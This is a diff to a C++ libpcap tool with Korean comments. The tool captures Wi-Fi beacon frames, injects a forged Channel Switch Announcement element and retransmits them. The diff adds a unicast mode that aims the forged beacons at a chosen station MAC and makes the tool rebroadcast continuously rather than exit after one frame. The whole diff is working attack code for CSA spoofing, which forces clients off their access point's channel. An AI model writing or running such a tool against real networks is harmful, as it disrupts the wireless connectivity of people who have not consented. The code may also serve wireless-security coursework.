@@ -7,6 +7,19 @@
 #include <cstdint>
 #include <algorithm>
 
+// MAC 문자열을 6바이트 배열로 변환하는 헬퍼 함수
+bool parseMAC(const std::string &macStr, uint8_t mac[6]) {
+    int values[6];
+    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
+               &values[0], &values[1], &values[2],
+               &values[3], &values[4], &values[5]) == 6) {
+        for (int i = 0; i < 6; i++)
+            mac[i] = static_cast<uint8_t>(values[i]);
+        return true;
+    }
+    return false;
+}
+
 // --- 구조체 패킹 적용 ---
 // Radiotap 헤더: 패킹 지시어를 사용하여 구조체 크기가 실제 필드 크기와 일치하도록 함
 #pragma pack(push, 1)
@@ -69,7 +82,7 @@ public:
     // CSA IE 생성 (예시: 태그 번호 0x25, 길이 3)
     static InfoElement createCSA(uint8_t newChannel, uint8_t switchCount) {
         InfoElement ie;
-        ie.id = 0x25; // CSA 태그 번호
+        ie.id = 0x25; // CSA IE 태그 번호
         ie.length = 3; // 예시 길이
         ie.data.push_back(0x01);    // 채널 전환 모드 (예: 1)
         ie.data.push_back(newChannel);    // 새 채널
@@ -132,7 +145,7 @@ public:
             // DS Parameter Set IE가 있으면 그 바로 뒤에 CSA IE를 삽입
             infoElements.insert(dsIt + 1, csaIE);
         } else {
-            // DS Parameter Set IE가 없으면 태그번호 순서 기준으로 CSA IE(0x25)보다 큰 첫 IE 앞에 삽입
+            // DS Parameter Set IE가 없으면 태그번호 기준으로 CSA IE(0x25)보다 큰 첫 IE 앞에 삽입
             auto posIt = std::find_if(infoElements.begin(), infoElements.end(), [&](const InfoElement& ie) {
                 return ie.id > 0x25;
             });
@@ -144,7 +157,6 @@ public:
             }
         }
     }
-
 
     // BeaconFrame을 raw 바이트 배열로 직렬화 (간략화)
     std::vector<uint8_t> buildFrame() {
@@ -184,8 +196,8 @@ void sendPacket(const std::string& dev, const std::vector<uint8_t>& packet) {
         if ((i + 1) % 16 == 0)
             std::cout << std::endl;
     }
-    std::cout << "=========================\n";
-    std::cout << std::dec << std::endl;
+    std::cout << "\n=========================\n";
+    std::cout << std::dec;
     if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
         std::cerr << "패킷 전송 오류: " << pcap_geterr(handle) << std::endl;
     } else {
@@ -194,10 +206,10 @@ void sendPacket(const std::string& dev, const std::vector<uint8_t>& packet) {
     pcap_close(handle);
 }
 
-// broadcast 처리 함수 (unicast의 경우도 유사하게 적용 가능)
+// broadcast 처리 함수 (대상 MAC은 브로드캐스트 주소 유지)
 void processBroadcast(const std::string& dev, const uint8_t* rawPacket, size_t len, uint8_t newChannel, uint8_t switchCount) {
     std::cout << "========================================" << std::endl;
-    std::cout << "패킷 수신: " << len << "바이트" << std::endl;
+    std::cout << "패킷 수신 (Broadcast): " << len << "바이트" << std::endl;
     for (size_t i = 0; i < len; i++) {
         std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)rawPacket[i] << " ";
         if ((i + 1) % 16 == 0)
@@ -209,27 +221,11 @@ void processBroadcast(const std::string& dev, const uint8_t* rawPacket, size_t l
     RadiotapHeader rtHeader(rawPacket);
     size_t offset = rtHeader.len;
     
-    // 최소 길이 확인
-    if (len < offset + sizeof(IEEE80211Header))
-        return;
-
-    // --- 보다 정교한 beacon frame 판별 --- 
-    // IEEE 802.11 헤더의 frameControl 필드(2바이트)를 읽어, 관리 프레임(type 0) 및 beacon(subtype 8)인지 확인
-    uint16_t fc = *((uint16_t*)(rawPacket + offset));
-    uint8_t subtype = (fc >> 4) & 0x0F;
-    uint8_t type = (fc >> 2) & 0x03;
-    if (type != 0 || subtype != 8) {
-        // beacon frame이 아니면 건너뜀
-        return;
-    }
-
     // beacon 프레임 파싱
     BeaconFrame beacon;
     beacon.parse(rawPacket + offset, len - offset);
     
-    // (추가 검증: source address 비교 등 필요 시)
-    
-    // CSA IE 삽입 (기존 CSA IE가 있으면 업데이트, 없으면 추가)
+    // CSA IE 삽입 (없으면 추가, 있으면 업데이트)
     beacon.insertCSA(newChannel, switchCount);
 
     // BeaconFrame 직렬화 후, 원본 Radiotap 헤더와 합쳐 최종 패킷 생성
@@ -242,19 +238,70 @@ void processBroadcast(const std::string& dev, const uint8_t* rawPacket, size_t l
     sendPacket(dev, newPacket);
 }
 
+// unicast 처리 함수 (사용자로부터 입력받은 stationMAC을 목적지 주소로 설정)
+void processUnicast(const std::string& dev, const uint8_t* rawPacket, size_t len,
+                    uint8_t newChannel, uint8_t switchCount, const std::string &stationMAC) {
+    std::cout << "========================================" << std::endl;
+    std::cout << "패킷 수신 (Unicast): " << len << "바이트" << std::endl;
+    for (size_t i = 0; i < len; i++) {
+        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)rawPacket[i] << " ";
+        if ((i + 1) % 16 == 0)
+            std::cout << std::endl;
+    }
+    std::cout << std::dec << std::endl;
+    
+    // Radiotap 헤더 파싱 및 실제 프레임 시작 오프셋 계산
+    RadiotapHeader rtHeader(rawPacket);
+    size_t offset = rtHeader.len;
+    
+    // beacon 프레임 파싱
+    BeaconFrame beacon;
+    beacon.parse(rawPacket + offset, len - offset);
+    
+    // CSA IE 삽입 (없으면 추가, 있으면 업데이트)
+    beacon.insertCSA(newChannel, switchCount);
+    
+    // stationMAC을 파싱하여 beacon 헤더의 목적지 주소(addr1)로 설정
+    uint8_t destMAC[6];
+    if (!parseMAC(stationMAC, destMAC)) {
+        std::cerr << "유효하지 않은 station MAC: " << stationMAC << std::endl;
+        return;
+    }
+    memcpy(beacon.header.addr1, destMAC, 6);
+    
+    // BeaconFrame 직렬화 후, 원본 Radiotap 헤더와 합쳐 최종 패킷 생성
+    std::vector<uint8_t> newPacket;
+    newPacket.insert(newPacket.end(), rawPacket, rawPacket + rtHeader.len);
+    std::vector<uint8_t> beaconFrame = beacon.buildFrame();
+    newPacket.insert(newPacket.end(), beaconFrame.begin(), beaconFrame.end());
+
+    // 패킷 전송
+    sendPacket(dev, newPacket);
+}
+
 int main(int argc, char* argv[]) {
+    // 사용법: <인터페이스> <apMAC> [<stationMAC>]
     if (argc < 3) {
         std::cerr << "사용법: " << argv[0] << " <인터페이스> <apMAC> [<stationMAC>]" << std::endl;
         return -1;
     }
+    // stationMAC이 제공되면 unicast 모드, 아니면 broadcast 모드로 동작
+    bool isUnicast = (argc >= 4);
+    std::string dev(argv[1]);
+    std::string apMAC(argv[2]); // apMAC은 추후 추가 검증이나 필터링에 사용할 수 있음
+    std::string stationMAC = "";
+    if (isUnicast) {
+        stationMAC = std::string(argv[3]);
+    }
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcapHandle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
+    pcap_t* pcapHandle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
     if (!pcapHandle) {
         std::cerr << "pcap_open_live 실패: " << errbuf << std::endl;
         return -1;
     }
 
+    // 패킷 캡처 루프
     while (true) {
         struct pcap_pkthdr* header;
         const uint8_t* packet;
@@ -278,16 +325,18 @@ int main(int argc, char* argv[]) {
         if (header->caplen < rt_len + sizeof(IEEE80211Header))
             continue;
 
-        // IEEE80211 헤더 판별 (보다 정교하게 관리 프레임/Beacon 판별)
+        // IEEE80211 헤더 판별 (정확하게 관리 프레임/Beacon 판별)
         uint16_t fc = *((uint16_t*)(packet + rt_len));
         uint8_t subtype = (fc >> 4) & 0x0F;
         uint8_t type = (fc >> 2) & 0x03;
         if (type != 0 || subtype != 8)
             continue;
 
-        // beacon frame인 경우에만 처리 (CSA IE 삽입 후 전송)
-        processBroadcast(argv[1], packet, header->caplen, 0x0b, 0x03);
-        return 0;
+        // 모드에 따라 broadcast 또는 unicast 함수 호출
+        if (isUnicast)
+            processUnicast(dev, packet, header->caplen, 0x0b, 0x03, stationMAC);
+        else
+            processBroadcast(dev, packet, header->caplen, 0x0b, 0x03);
     }
 
     pcap_close(pcapHandle);
